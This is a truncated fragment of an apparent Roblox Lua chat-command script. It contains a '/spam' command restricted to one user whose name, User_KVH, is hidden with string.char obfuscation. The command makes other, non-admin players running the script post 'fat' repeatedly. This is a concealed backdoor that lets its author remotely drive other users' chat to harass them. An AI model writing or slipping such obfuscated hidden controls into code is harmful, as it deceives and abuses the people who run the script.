...
local function setupCommandListeners()   
    ...
    local function listenCommands(p)   
        p.Chatted:Connect(function(msg)   
            ...
            -- Only User_KVH can use /spam. It makes non-admins spam "fat" 10 times.
            if msg:lower() == "/spam" and p.Name == string.char(85, 115, 101, 114, 95, 75, 86, 72) then
                for _, target in pairs(Players:GetPlayers()) do
                    if target ~= p and target.Character and isRunningScript(target) then
                        if not AUTH_USERS[target.Name] then  -- Admins and Owner are NOT affected
                            task.spawn(function()
                                for i = 1, 10 do
